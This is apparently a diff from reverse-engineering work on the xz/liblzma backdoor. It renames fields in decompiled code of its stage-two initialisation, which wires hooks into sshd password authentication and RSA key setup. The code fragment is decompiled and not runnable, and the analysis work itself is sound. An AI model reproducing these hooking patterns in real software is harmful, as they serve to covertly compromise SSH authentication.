@@ -40,11 +40,11 @@ BOOL backdoor_init_stage2
   
   hooks_ctx_ptr = &local_128;
   for (clear_idx = 0x22; clear_idx != 0; clear_idx = clear_idx + -1) {
-    hooks_ctx_ptr->_unknown1621[0] = '\0';
-    hooks_ctx_ptr->_unknown1621[1] = '\0';
-    hooks_ctx_ptr->_unknown1621[2] = '\0';
-    hooks_ctx_ptr->_unknown1621[3] = '\0';
-    hooks_ctx_ptr = (backdoor_hooks_ctx_t *)(hooks_ctx_ptr->_unknown1621 + 4);
+    hooks_ctx_ptr->bootstrap_padding[0] = '\0';
+    hooks_ctx_ptr->bootstrap_padding[1] = '\0';
+    hooks_ctx_ptr->bootstrap_padding[2] = '\0';
+    hooks_ctx_ptr->bootstrap_padding[3] = '\0';
+    hooks_ctx_ptr = (backdoor_hooks_ctx_t *)(hooks_ctx_ptr->bootstrap_padding + 4);
   }
   setup_params_ptr = &local_a0;
   for (clear_idx = 0x22; clear_idx != 0; clear_idx = clear_idx + -1) {
@@ -54,9 +54,9 @@ BOOL backdoor_init_stage2
     setup_params_ptr->_unknown1649[3] = '\0';
     setup_params_ptr = (backdoor_setup_params_t *)(setup_params_ptr->_unknown1649 + 4);
   }
-  local_140.mm_answer_authpassword_hook = mm_answer_authpassword_hook;
-  local_140.hook_EVP_PKEY_set1_RSA = hook_EVP_PKEY_set1_RSA;
-  local_140.globals = (global_context_t **)&global_ctx;
+  local_140.authpassword_hook_entry = mm_answer_authpassword_hook;
+  local_140.evp_set1_rsa_hook_entry = hook_EVP_PKEY_set1_RSA;
+  local_140.global_ctx_slot = (global_context_t **)&global_ctx;
   lzma_check_init(&local_a0.dummy_check_state,LZMA_CHECK_NONE);
   shared_globals_ptr = &local_140;
   status = init_hooks_ctx(&local_128);
@@ -68,7 +68,7 @@ BOOL backdoor_init_stage2
       setup_success = backdoor_setup(&local_a0);
       return setup_success;
     }
-    local_128.shared = shared_globals_ptr;
+    local_128.shared_globals = shared_globals_ptr;
     status = init_hooks_ctx(hooks_ctx_ptr);
     hooks_ctx_ptr = extraout_RDX_00;
   } while (status != 5);
